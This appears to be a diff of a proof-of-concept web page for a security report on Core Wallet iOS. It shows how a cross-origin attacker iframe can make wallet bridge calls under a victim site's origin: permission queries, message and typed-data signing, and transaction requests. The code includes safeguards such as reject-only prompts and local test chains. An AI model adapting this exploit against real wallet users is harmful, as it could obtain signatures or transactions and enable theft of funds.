@@ -1,253 +1,233 @@
 <!doctype html>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-
-<title>Core Wallet iOS - Permission Reuse PoC</title>
-
+<title>Core Wallet iOS - Cross-Origin Authorization Reuse</title>
 <style>
-body{
-  margin:20px;
-  background:#fff;
-  color:#111;
-  font:16px -apple-system,BlinkMacSystemFont,sans-serif;
-  line-height:1.5
-}
-button{padding:10px 14px;margin:6px 0}
-pre{
-  white-space:pre-wrap;
-  overflow-wrap:anywhere;
-  padding:12px;
-  background:#f7f7f7;
-  border:1px solid #ccc
-}
-.bad{
-  padding:12px;
-  border:2px solid #b00000;
-  color:#b00000;
-  font-weight:bold
-}
-iframe{width:100%;height:80px;border:1px solid #ccc}
+body{margin:20px;background:#fff;color:#111;font:16px/1.5 -apple-system,BlinkMacSystemFont,sans-serif}
+button{display:block;width:100%;padding:11px 14px;margin:7px 0;text-align:left}button:disabled{opacity:.45}
+pre{white-space:pre-wrap;overflow-wrap:anywhere;padding:12px;background:#f7f7f7;border:1px solid #ccc}
+.bad{padding:12px;border:2px solid #b00000;color:#b00000;font-weight:bold}.warn{padding:10px;border:1px solid #b36b00;background:#fff8e8}
+iframe{width:100%;height:92px;border:1px solid #ccc}
 </style>
 
-<h2>Core Wallet iOS - Cross-Origin Permission Reuse</h2>
-
-<p>
-Victim A: <b id="a"></b><br>
-Attacker B: <b>https://azza1231.github.io</b>
-</p>
+<h2>Core Wallet iOS - Cross-Origin Authorization Reuse</h2>
+<p>Victim A: <b id="a"></b><br>Attacker B: <b id="b"></b></p>
+<p class="warn"><b>Controlled test only.</b> Use a burner account. Always Reject/Cancel native signing and transaction confirmations. The transaction test only runs on an allowlisted local development chain.</p>
 
 <button id="connect">1. Connect Origin A</button>
-<button id="attack" disabled>2. Origin B calls wallet_getPermissions as A</button>
+<button id="permissions" disabled>2. B invokes wallet_getPermissions under A</button>
+<button id="personal" disabled>3. B requests dummy personal_sign as A — REJECT</button>
+<button id="typed" disabled>4. B requests dummy typed data as A — REJECT</button>
+<button id="transaction" disabled>5. B requests 0 ETH self-transfer as A — TESTNET + REJECT</button>
 
 <div id="verdict" class="bad" hidden></div>
-
 <pre id="log">Loading attacker iframe...</pre>
-
 <iframe id="frame"></iframe>
 
 <script>
-const ATTACKER =
-  'https://azza1231.github.io/pocpoc/attacker.html';
+'use strict';
 
-const TEST_ID = 733731;
+const ATTACKER = 'https://azza1231.github.io/pocpoc/attacker.html';
+const IDS = Object.freeze({
+  permissions: 733731,
+  personalSign: 733732,
+  typedData: 733733,
+  transaction: 733734
+});
+const SAFE_TEST_CHAIN_IDS = new Set([
+  '0x7a69',   // Anvil/Hardhat local
+  '0x539'     // Ganache local
+]);
 
 const frame = document.getElementById('frame');
 const log = document.getElementById('log');
 const verdict = document.getElementById('verdict');
+const attackerOrigin = new URL(ATTACKER).origin;
+const buttons = {
+  connect: document.getElementById('connect'),
+  permissions: document.getElementById('permissions'),
+  personal: document.getElementById('personal'),
+  typed: document.getElementById('typed'),
+  transaction: document.getElementById('transaction')
+};
 
-const attackerOrigin =
-  new URL(ATTACKER).origin;
+let attackerReady = false;
+let connectedAccount = '';
+let connectedChainId = '';
+let permissionReuseProven = false;
+const sentRequests = new Map();
 
-document.getElementById('a').textContent =
-  location.origin;
+document.getElementById('a').textContent = location.origin;
+document.getElementById('b').textContent = attackerOrigin;
 
-function print(s = '') {
-  log.textContent += s + '\n';
+function print(text = '') {
+  log.textContent += text + '\n';
 }
 
+function showVerdict(text) {
+  verdict.hidden = false;
+  verdict.textContent = text;
+}
 
-// Load B
-const u = new URL(ATTACKER);
+function validAddress(value) {
+  return /^0x[0-9a-fA-F]{40}$/.test(value);
+}
 
-/*
- * cache buster supaya GitHub Pages tidak kasih attacker.html lama
- */
-u.searchParams.set('v', Date.now());
+function permissionAddresses(result) {
+  if (!Array.isArray(result)) return [];
+  return result.flatMap(permission =>
+    Array.isArray(permission?.caveats)
+      ? permission.caveats.flatMap(caveat =>
+          caveat?.type === 'restrictReturnedAccounts' && Array.isArray(caveat.value)
+            ? caveat.value.filter(validAddress)
+            : []
+        )
+      : []
+  );
+}
 
-u.searchParams.set(
-  'victimOrigin',
-  location.origin
-);
+function installResponseObserver() {
+  if (window.__coreChainObserver) return true;
+  if (typeof window.__coreProviderRespond !== 'function') {
+    print('ERROR: __coreProviderRespond unavailable');
+    return false;
+  }
 
-frame.src = u.href;
+  const original = window.__coreProviderRespond;
+  window.__coreProviderRespond = function(id, error, result) {
+    const request = sentRequests.get(id);
+    if (request) {
+      print('');
+      print(`=== CORE NATIVE RESPONSE: ${request.method} ===`);
+      print(JSON.stringify({
+        id,
+        executingOrigin: location.origin,
+        actualSenderOrigin: attackerOrigin,
+        claimedOrigin: location.origin,
+        error,
+        result
+      }, null, 2));
 
+      if (id === IDS.permissions) {
+        const addresses = permissionAddresses(result);
+        const connectedWasReused = !error && addresses.some(
+          address => address.toLowerCase() === connectedAccount.toLowerCase()
+        );
+        if (connectedWasReused) {
+          permissionReuseProven = true;
+          buttons.personal.disabled = false;
+          buttons.typed.disabled = false;
+          buttons.transaction.disabled = false;
+          showVerdict('STAGE 1 VALID: Core authorized B\'s request under A and dispatched A\'s permission/account result into A.');
+          print('STAGE 1 VALID: B claimed A; Core accepted the request and delivered A\'s authorized account to A\'s native callback.');
+        }
+      } else if (error) {
+        const rejected = error.code === 4001 || /reject|cancel/i.test(error.message || '');
+        if (rejected) {
+          showVerdict(`SENSITIVE FLOW REACHED: ${request.method} was accepted as A and then rejected by the tester.`);
+          print('VALID SAFE TERMINATION: native approval pipeline returned user rejection.');
+        }
+      } else {
+        showVerdict(`STOP: ${request.method} returned success. Do not use this result; the PoC required rejection.`);
+        print('WARNING: request was approved instead of rejected. Do not broadcast or reuse any returned signature/hash.');
+      }
+      sentRequests.delete(id);
+    }
+    return original.apply(this, arguments);
+  };
+  window.__coreChainObserver = true;
+  return true;
+}
 
-// Receive authenticated messages from B
+function command(type, id, method, extra = {}) {
+  if (!attackerReady || !installResponseObserver()) return;
+  sentRequests.set(id, { method, sentAt: new Date().toISOString() });
+  print('');
+  print(`=== SEND ${method} FROM CROSS-ORIGIN B ===`);
+  print('Browser-authenticated B: ' + attackerOrigin);
+  print('Origin claimed by B: ' + location.origin);
+  frame.contentWindow.postMessage({
+    type,
+    id,
+    account: connectedAccount,
+    chainId: connectedChainId,
+    ...extra
+  }, attackerOrigin);
+}
+
+const childUrl = new URL(ATTACKER);
+childUrl.searchParams.set('v', Date.now());
+childUrl.searchParams.set('victimOrigin', location.origin);
+frame.src = childUrl.href;
+
 addEventListener('message', event => {
+  if (event.source !== frame.contentWindow || event.origin !== attackerOrigin) return;
+  const data = event.data;
+  if (!data) return;
 
-  if (event.source !== frame.contentWindow)
-    return;
-
-  if (event.origin !== attackerOrigin)
-    return;
-
-  const d = event.data;
-
-  if (!d) return;
-
-
-  if (d.type === 'READY') {
-
-    log.textContent =
-`Browser-confirmed Origin B:
-${event.origin}
-
-Victim Origin A:
-${location.origin}
-
-Child says victimOrigin:
-${d.victimOrigin}
-
-Native bridge visible in B:
-${d.bridgeVisible}
-
-Ready.`;
-
-  }
-
-
-  if (d.type === 'TRIGGER_RECEIVED') {
-
+  if (data.type === 'READY') {
+    const strictChildProof =
+      data.bridgeVisible === true &&
+      data.isSubframe === true &&
+      data.actualOrigin === attackerOrigin &&
+      data.victimOrigin === location.origin;
+    attackerReady = strictChildProof;
+    if (validAddress(connectedAccount)) {
+      buttons.permissions.disabled = !attackerReady;
+    }
+    log.textContent = `Browser-confirmed Origin B:\n${event.origin}\n\nVictim Origin A:\n${location.origin}\n\nChild actual origin:\n${data.actualOrigin}\n\nChild is cross-origin subframe:\n${data.isSubframe}\n\nChild says victimOrigin:\n${data.victimOrigin}\n\nNative bridge visible in B:\n${data.bridgeVisible}\n\nStrict child proof:\n${strictChildProof}\n\n${strictChildProof ? 'Ready.' : 'BLOCKED: child provenance check failed.'}`;
+  } else if (data.type === 'TRIGGER_RECEIVED') {
     print('');
-    print('[ACK] attacker.html received button #2 command');
-  }
-
-
-  if (d.type === 'REQUEST_SENT') {
-
-    print('');
-    print('[ACK] Origin B called Core native bridge');
-    print('Method: wallet_getPermissions');
-    print('ID: ' + d.id);
-  }
-
-
-  if (d.type === 'CHILD_ERROR') {
-
-    print('');
-    print('ATTACKER ERROR: ' + d.message);
+    print(`[ACK] B received ${data.command}`);
+  } else if (data.type === 'REQUEST_SENT') {
+    print(`[ACK] B called Core bridge: ${data.method}, ID ${data.id}`);
+    if (data.proof) print('Attacker-selected proof: ' + JSON.stringify(data.proof));
+  } else if (data.type === 'CHILD_ERROR') {
+    sentRequests.delete(data.id);
+    print('ATTACKER ERROR: ' + data.message);
   }
 });
 
-
-// Step 1
-document.getElementById('connect').onclick = async () => {
-
-  if (!window.ethereum?.request) {
-    print('Core provider unavailable.');
-    return;
-  }
-
+buttons.connect.onclick = async () => {
+  if (!window.ethereum?.request) return print('Core provider unavailable.');
   try {
-
     print('');
     print('Origin A calling eth_requestAccounts...');
-
-    const accounts =
-      await window.ethereum.request({
-        method: 'eth_requestAccounts'
-      });
-
-    print(
-      'Origin A connected: ' +
-      JSON.stringify(accounts)
-    );
-
-    document.getElementById('attack').disabled =
-      false;
-
-  } catch (e) {
-
-    print(
-      'Connect failed: ' +
-      String(e?.message || e)
-    );
+    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+    connectedAccount = accounts?.[0] || '';
+    connectedChainId = await window.ethereum.request({ method: 'eth_chainId' });
+    if (!validAddress(connectedAccount)) throw new Error('No valid account returned');
+    print('Origin A connected: ' + JSON.stringify(accounts));
+    print('Chain ID: ' + connectedChainId);
+    buttons.connect.disabled = true;
+    buttons.permissions.disabled = !attackerReady;
+  } catch (error) {
+    print('Connect failed: ' + String(error?.message || error));
   }
 };
 
+buttons.permissions.onclick = () =>
+  command('GET_PERMISSIONS_AS_A', IDS.permissions, 'wallet_getPermissions');
 
-// Step 2
-document.getElementById('attack').onclick = () => {
+buttons.personal.onclick = () => {
+  if (!permissionReuseProven) return;
+  buttons.personal.disabled = true;
+  command('PERSONAL_SIGN_AS_A', IDS.personalSign, 'personal_sign');
+};
 
-  print('');
-  print('=== CROSS-ORIGIN TEST ===');
+buttons.typed.onclick = () => {
+  if (!permissionReuseProven) return;
+  buttons.typed.disabled = true;
+  command('TYPED_DATA_AS_A', IDS.typedData, 'eth_signTypedData_v4');
+};
 
-  if (
-    typeof window.__coreProviderRespond !== 'function'
-  ) {
-    print('ERROR: __coreProviderRespond unavailable');
+buttons.transaction.onclick = () => {
+  if (!permissionReuseProven) return;
+  if (!SAFE_TEST_CHAIN_IDS.has(String(connectedChainId).toLowerCase())) {
+    showVerdict('TRANSACTION TEST BLOCKED. Switch Core to a local Anvil/Hardhat/Ganache chain, then reconnect.');
     return;
   }
-
-
-  /*
-   * Install observer immediately before request.
-   */
-  if (!window.__pocObserver) {
-
-    const original =
-      window.__coreProviderRespond;
-
-    window.__coreProviderRespond =
-      function(id, error, result) {
-
-        if (id === TEST_ID) {
-
-          print('');
-          print('=== CORE NATIVE RESPONSE ===');
-
-          print(JSON.stringify({
-            id,
-            error,
-            result
-          }, null, 2));
-
-
-          if (
-            !error &&
-            Array.isArray(result) &&
-            result.length > 0
-          ) {
-
-            verdict.hidden = false;
-
-            verdict.textContent =
-              'VULNERABLE: Cross-origin Origin B obtained permission state while impersonating Origin A.';
-
-          }
-        }
-
-        return original.apply(
-          this,
-          arguments
-        );
-      };
-
-    window.__pocObserver = true;
-  }
-
-
-  print('Actual Origin B: ' + attackerOrigin);
-  print('Origin claimed by B: ' + location.origin);
-  print('Sending command to attacker iframe...');
-
-
-  frame.contentWindow.postMessage(
-    {
-      type: 'GET_PERMISSIONS_AS_A',
-      id: TEST_ID
-    },
-    attackerOrigin
-  );
+  buttons.transaction.disabled = true;
+  command('ZERO_TX_AS_A', IDS.transaction, 'eth_sendTransaction');
 };
 </script>
